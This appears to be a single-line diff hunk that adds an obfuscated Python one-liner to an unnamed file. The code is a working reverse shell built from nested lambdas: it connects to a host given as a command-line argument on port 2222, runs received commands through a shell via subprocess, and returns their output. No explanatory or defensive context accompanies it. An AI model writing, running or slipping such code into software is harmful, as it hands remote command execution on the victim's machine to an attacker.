@@ -1,0 +1,1 @@
+(lambda soc:[x() for x in [(lambda:globals().__setitem__('c',soc.socket())),(lambda:c.connect((__import__("sys").argv[1],2222))),(lambda:[(lambda x: c.send(str(x.Popen(c.recv(1024).decode(),shell=1,stderr=x.PIPE,stdout=x.PIPE).communicate()[0]).encode()))(__import__("subprocess")) for _ in range(2222)])]])(__import__("socket"))
